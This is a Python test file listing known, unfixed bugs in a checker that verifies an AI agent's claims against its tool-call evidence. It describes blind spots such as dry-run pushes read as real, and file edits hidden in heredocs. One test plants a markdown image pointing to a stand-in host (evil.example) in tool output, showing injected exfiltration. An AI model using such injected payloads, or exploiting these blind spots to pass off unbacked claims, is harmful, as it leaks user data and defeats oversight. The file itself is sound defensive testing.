"""Fable 5.2 review: bugs found and NOT fixed on this branch, each as a test that fails today.

Every test here is marked expectedFailure, so the suite stays green and the count of
"expected failures" is the count of open bugs. Fixing one turns it into an "unexpected
success", which unittest reports, so the marker gets removed with the fix. Each docstring
says why the bug was left open during the freeze. All examples invented.
"""
import json
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import engine  # noqa: E402


def term(cmd, out="", code=0, seq=0):
    return engine.classify_call("terminal", {"command": cmd},
                                json.dumps({"output": out, "exit_code": code, "error": None}), None, seq=seq)


def statuses(reply, evidence):
    return [v.status for v in engine.check_turn(reply, [e for e in evidence if e])]


class OpenBugs(unittest.TestCase):
    @unittest.expectedFailure
    def test_a_dry_run_is_not_a_push(self):
        """`git push --dry-run` (and `npm publish --dry-run`, `kubectl apply --dry-run=client`)
        is recorded as a successful push/deploy, so "Pushed to main." reads BACKED.
        Left open: the right verdict (FAILED "only a dry run" vs. no evidence) and how a reply
        that honestly says "dry run" should read need a decision and a bench pass."""
        self.assertNotIn("BACKED", statuses("Pushed.",
                                            [term("git push --dry-run origin main", "main -> main", 0, 1)]))
        self.assertNotIn("BACKED", statuses("Published v1.2.0 to npm.",
                                            [term("npm publish --dry-run", "+ pkg@1.2.0", 0, 1)]))

    @unittest.expectedFailure
    def test_a_passing_run_that_logs_a_traceback_is_not_a_failed_run(self):
        """`traceback` is a STRONG failure marker: exit code 0 and "Ran 4 tests ... OK" do not
        override it, so a unittest suite that exercises an error path (logging.exception)
        turns "All tests pass." into FAILED. Same for a log line like "recovered after 2
        errors". Left open: 1 of the 42 FAILED alerts in real history has this shape, so the
        payoff is small and demoting a strong marker deserves its own bench pass."""
        out = ("ERROR:root:boom\nTraceback (most recent call last):\n  File \"x.py\", line 3\n"
               "ValueError: expected in test\n....\n" + "-" * 70 + "\nRan 4 tests in 0.01s\n\nOK")
        self.assertEqual(statuses("All tests pass.", [term("python3 -m unittest discover -s tests", out, 0, 1)]),
                         ["BACKED"])

    @unittest.expectedFailure
    def test_tool_output_cannot_put_markdown_into_the_reply_line(self):
        """A failed call's reason is up to 70 characters of the tool's own output after
        "Error:", copied verbatim into the Check line under the reply, the cron guard line on
        top of a delivered cron message, and the pre_verify directive sent back to the model.
        Tool output is untrusted text: here it plants a markdown image (a fetch to a third
        party when a chat surface renders it). Left open: needs a decision on how notes are
        quoted and escaped everywhere they are printed, not a one-line strip."""
        ev = term("./deploy.sh prod", "Error: ![x](https://evil.example/p.png?d=1)", 1, 1)
        line = engine.summary_line(engine.check_turn("Deployed to prod.", [ev]))
        self.assertNotIn("![", line)

    @unittest.expectedFailure
    def test_a_file_edit_made_by_a_script_body_is_an_edit(self):
        """An agent that edits code with a Python heredoc (open(p, "w").write(...)) or
        `python3 -c` leaves no write evidence: only write_file/patch and a few shell verbs are
        read. Tests pass, the script rewrites src/app.py, "Tests pass." stays BACKED.
        112 heredoc commands in real history contain such a write. Left open: reading file
        names out of script bodies is new evidence coverage, not a fix."""
        body = "python3 - <<'PY'\np = 'src/app.py'\ns = open(p).read().replace('1', '2')\nopen(p, 'w').write(s)\nPY"
        self.assertEqual(statuses("Tests pass.", [term("pytest -q", "5 passed", 0, 1), term(body, "", 0, 2)]),
                         ["STALE"])

    @unittest.expectedFailure
    def test_a_write_on_a_later_line_of_a_multi_line_command_is_an_edit(self):
        """The cp/mv/sed -i patterns anchor on the start of the command or a ; & | separator,
        never a line break, so a write on the second line of a multi-line command is unseen."""
        ev = term("cd app\ncp fixed.py src/app.py", "", 0, 2)
        self.assertIsNotNone(ev)

    @unittest.expectedFailure
    def test_a_pronoun_for_the_tests_does_not_void_the_claim(self):
        """"them"/"they"/"their" within 40 characters before a claim reads as a third party
        and voids it, so "Reran them: tests pass." makes no claim at all. Left open: trying
        the obvious exemption moved nothing on the held-out set (tested recall stays 0.42)."""
        self.assertEqual([c.kind for c in engine.extract_claims("Reran them: tests pass.")], ["tested"])


if __name__ == "__main__":
    unittest.main()
